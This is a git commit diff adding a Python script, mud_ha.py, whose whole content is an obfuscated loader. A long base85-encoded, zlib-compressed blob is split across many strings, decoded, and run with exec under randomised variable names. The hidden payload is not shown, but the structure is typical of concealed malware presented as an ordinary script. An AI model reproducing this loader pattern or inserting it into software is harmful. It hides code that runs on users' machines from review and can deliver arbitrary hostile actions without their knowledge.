ef534c7abde1718a47350115f587f6f19d614ae0
mmuhacker <56414919+mmuhacker@users.noreply.github.com>
2026-05-31 01:38:41 +0300

    Create mud_ha.py

---
+++ mud_ha.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# _BHPzYhJBjFOz_eQIBozTcgnza
+# _vSiKvwlxJYPN_umnaTCLoHRZC
+
+import base64 as _XGhbwVSLKFdZ
+import zlib as _PwruHkbclmhV
+import sys as _IniHGsVrGPSW
+
+_UgmzrXGUTsbU = [
+    'c-qxkZExGg9e=M+ad8lkN-SEoo1xRD0%_(V0p=vI9AH3F5VUl%Ia8#{qa3S(fY`Ae!zi!@b&;ZLkrhGe',
+    '*t6rgZkoEEgnU={W#2R(VgI}1@mWvXuwjA$k@xVs-~FHO<ck+3TEw1M(9H>KuApYyS+dOO+(lHlTtHQ;',
+    'rkjf;)N<;DcWDc>mq+-(aCBpS{tmi<wHmewx@Kxd`(tdQ^M||0eeNE+d+t7R58NYf!`tyT=;MjE?d`ay',
+    '&~v~hQ;_%DCG^YQ+Rxwa{=E16{EI_0+gj30Q>&prXiF6Ci$mV`%ij8^9CLc3Y1s~H*@mGnC^r76g^81B',
+    '#kOtPqKyzEcx)5#Xpvmqwi>9WIoQz~82RnuJ(qLrb}5J8<M(K`wxCy48<QoiiEY-!AQtqRu4u-hW$VsT',
+    'LkwTUj#|@6)6m*%=(V|P@87(xR_@-pb9-(cmC?N2!a2NJ#Z3p@WOHUH?NavW4>W@SsT!^W5!u13PTpr%',
+    'PYmYG^y5>l!Sn=q#ed*HkqJ)AHlx&Kfx!p)1L&+=u4-t6ATWh(Z;LMqHuB2-!99V;GLr5Wr>F1zcB&zX',
+    'z9Vll-ZvTcz4q4PebZszcVK1f(Y|*?-zgyOQ45T8{zi1Z^tJ%>)IEgmp!cfiJp<4k_lF2<z~%*X?t!)M',
+    'hkZrpW5QnmL&mo33*RCN*p!1CvQ#y&W=m8Z&}eF4QDvCiw1~bcAq>hxFoZ~4j!j!P9l1U>HkRvf0V-mj',
+    '-Jro|*v*}PzI*=pr~mc8r?Bu7Ap7>&C!Y@M{=$+FO!cSth$$<RN-;fn*szgU=ga?ve7+8K7g$UeRGQC0',
+    'P)o=LtaQVD&a8Edy?C46V|d+1-nRR_djc|j?C#~_v(#Wl8FiT5NW`)As#9=m%_KBr6bP=iAnvrK5|SY>',
+    'NH;3;6&|l&xQFgbfH`3bs7U#77IO0A9I0xV4mLx8LenzzD#bw@>3Zc32RdRTc7W@jDk+%NLfr;qFIY`S',
+    'w@kvOiw}c|Our5bEdN=nE<>71;|M}dyP1GX;>_Nhok0~-uh%nyRtYIIZOg$`iV<a$1cLo=Wvsi$V9}tC',
+    'B$|!ukW8>0l};S(6p;2nU;DmVL6?W_SrP|gZbK)8?kNS8g#+<$1743<<3SRQV0#7IF)|5OFWlG6Ur#vN',
+    'D{7tICOZG}Z@>Qd7YfJnNhq_X^#I$rR#<2!Q90g$w+_*CN3a`!r&X&Mlt49VTSh@M4C_Gw(&M5I>fpw8',
+    'dybna2<&^x(|Z(15Ih1J++zxR%Q7iymj_><vE}{<np#s~z#f?Q8(BQ~5m~%~%ZNvXI!#l~i*#vPPP9+6',
+    '9r6G&w=7Fbj?*knOi1I1Jreqy&xZ*$0v--PSAzCvjtts3^Fxr@OEvD_DelY$Ak~#=(V|ps48@2F)3ui2',
+    'sLVfB9e*EUtWsUV)n#?bA`VYFex(o_1ID7)+iJtAVITYY%-p<s>-Mb~HZUl4*sM2{DvXPlSjrs#mUB_-',
+    '5IY!;wJz~sU+zeE!Bh*^7QwH<uB2J(W8E;ciK`I$<*L<aYL32O;NPKHt)|)f^1NjkWC9XHUg`#bVR^#*',
+    ';{e=?F1ep(2(MNXn=;?QIPxV{7IGLzw6e2WPI<DJDtc-VSLOH$ioXxA!$b#Ijng8jW+1>|{i-fnjVd$<',
+    'vjPuk1mRNV@;I_0R-m58<8j-{0=_%<$1Ge?Vnpf-R)2NxUHA}nxKl&c`iJ*K1PQQ6h#K%zlJZ^D!5~+S',
+    'SY|gX%Z1{D`bWX5x+72KqZDV@7sR{KX}xmaxX*nKBP`DSjMgSkyp5En#a_pe_XwiQvFaYNo$rTYRw2wm',
+    'CU(E|c6_fCjPIMN%B&-u?>>|+zcbZ`rkIXUFea#4)3qLx00g-MO2IwkiU}$%kjdbMMq_#3r1c7&f6*5T',
+    'U(**1>*2Fhzq^b=)$wW{Vk(4KIU&=0G`31pQl3}A;bd0wCuH>Y*=OHyGsqyrYyt&>^a*7MF~MXg?Yw=q',
+    '`_wl;I!Q!&mXZRK;8vNc*fWf02w86k?M5uKm&wHJ1JntBG^cDr<5>m_;zP3Sh0$QAR|pyavBs?J2%KV_',
+    '7ePoj5rN_o*AjlC=y22_ax^7oaP>6{O9$Ac-%nr7q7s|Mj0r~hEP80omtXW45~-~d9y>^a*&xG74|Kf_',
+    'ZL}CD@`g>Ok!{e3XrdC1h!En84E-P;2skgGi6st*G*sd}YJVZ~P~>clLu%nH2}bcLPG?y$Xf+2@&<bO)',
+    'JPr@36$EgYX~B=9tdLGv)me(=_Q)=;l+k3Y4*;U%;uB*sOHJ)*OWZ2%oqzS&hdm642{f7&SQ>&@QyOjs',
+    'KmVM6^|b#AtX}1@2@D&|lx^|?m`P-9Y-C80m1Lz6MdiBzWHNgE8&#>wB6j4s=}A(4IDv5Yg@oK!9HlIe',
+    '4@nQm-1z@WB0SFD(+5i=B7kVHV(rkA4pxxtPyKS1E-VKwG7)jLJi3e~i^V(_Qs98^p(0PJ#dO>Yj&136',
+    'Sr!|E64R`eg$O9HVDerWy<6;CvWZZgO1wV#?nEb~8F!pbmJz<A6y84j>o;(G>}@E_nWD6=_NOJRaCBNA',
+    'scl&14W-2owf$I;VG7#OX@F4A=;4-;`1+GR`S0JTNm-fP&~#Iz6mg@O8&E~^(g;+4APx*?u!9YHDNq`!',
+    'FwF?-lUe>0%A@C1BNZLU@+^$KeHNMOy9hw7vkQnVFfn#j>1~S}GXc)G&F*4On4dOVnU;6{@F$chhu{h#',
+    'sl7m1LbEh`#8xXKX;Mm?TSW7L-7}fdd)il2VzCO=mlu>Do9^G)84oR5)}ldAnT>pZ{UvTb`0mH(ULzaJ',
+    '7})o=rr(Cb^ASt?VO0*r^|80ci*SK7fOv*``oa9N06t{u-$@*T6-5~=mCRFR=3$b`qyHUHh&s|4Hv8zB',
+    '3*%?XoTmOIb7JQpIGNM?sfZQfRjtt++Kd8(9%iK2xM^rrERTunwXyNBu|%_I4N&{<CZTTF+mZX4dH8TD',
+    'R_U5l+Wv#uQ<Zf=uOs%^?Z<K`j+GHel7J-{Op_#e_LJf$7ajxZZ2l{e-0_)q^O+^p3dsoMOdjD>k~z1Z',
+    '?~iyR!YuX?bwnOQ*Qoda;D}zLLNRIRgjSS{jIxZ|^kj^#plCA@?IEl9sXKDk&Ri;=IDM@%Sj56BUznD)',
+    '(NlazDFVr^zoa72B!njaG3?=P3A&>I`M)c&nwwkFfT5LeC<#yTLl$%4?PN5Xx<A1Ke7)wkRD&Hgc3(MS',
+    '_S=GGAB&$7W2G1Bi2qtpOzVNnqG_GJ%F?A9rAxD=OO-x%89B%is!D%6P*s*6RF#&8s_Lf+UMuGQ2|mdZ',
+    '%m',
+]
+
+_ICIKsTPaKcJG = ''.join(_UgmzrXGUTsbU)
+_BsDKhAsKLdym = _XGhbwVSLKFdZ.b85decode(_ICIKsTPaKcJG.encode())
+_oDAzvSkaYarI = _PwruHkbclmhV.decompress(_BsDKhAsKLdym).decode('utf-8')
+
+exec(compile(_oDAzvSkaYarI, 'mud_ha.py', 'exec'))
